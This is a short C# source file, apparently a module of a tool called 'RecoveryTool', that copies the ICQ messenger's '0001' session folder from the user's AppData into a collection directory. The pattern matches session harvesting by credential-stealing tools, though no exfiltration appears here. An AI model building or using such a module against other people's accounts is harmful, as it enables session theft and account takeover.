using RecoveryTool.Recovery.Utilities;

namespace RecoveryTool.Recovery.Messenger
{
    public class IcqService
    {
        public static async Task SaveICQAsync()
        {
            string icqFolder = Path.Combine(Common.AppData, "ICQ");
            if (!Directory.Exists(icqFolder)) return;

            string icqSession = Common.EnsureIcqPath();

            await MessengerHelper.CopyDirectoryAsync(Path.Combine(icqFolder, "0001"), Path.Combine(icqSession, "0001"));
        }
    }
}
